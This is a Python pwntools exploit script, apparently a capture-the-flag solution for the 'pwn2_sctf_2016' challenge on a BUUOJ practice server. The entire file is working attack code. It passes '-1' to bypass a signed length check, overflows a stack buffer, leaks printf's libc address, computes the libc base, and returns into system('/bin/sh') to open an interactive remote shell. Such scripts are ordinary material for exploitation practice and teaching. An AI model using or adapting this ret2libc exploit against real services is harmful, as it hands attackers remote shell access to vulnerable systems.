from pwn import *
from LibcSearcher import *

#context.log_level = 'debug'

proc_name = './pwn2_sctf_2016'

#p = process(proc_name)
p = remote('node3.buuoj.cn', 26202)
elf = ELF(proc_name)

printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

vuln_addr = elf.symbols['vuln']

#try get libc
payload = b'a' * (0x2c + 4) + p32(printf_plt) + p32(vuln_addr) + p32(printf_got)

p.recvuntil('read? ')
p.sendline('-1')
p.recvuntil('data!\n')
p.sendline(payload)

p.recvuntil('\n')

printf_real_addr = u32(p.recv(4))

print('[+] printf -> {}'.format(hex(printf_real_addr)))

#ru guo shi ben di de hua, ji de ba zhege libc huan cheng LibcSeacher, wo zhe li yong de shi buu de libc, zai ben di pao bu dong
libc = ELF('libc-2.23.so')

libc_base = printf_real_addr - libc.symbols['printf']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * (0x2c + 4) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh_addr)

p.recvuntil('many')
p.sendline('-1')
p.recvuntil('data!\n')
p.sendline(payload)

p.interactive()
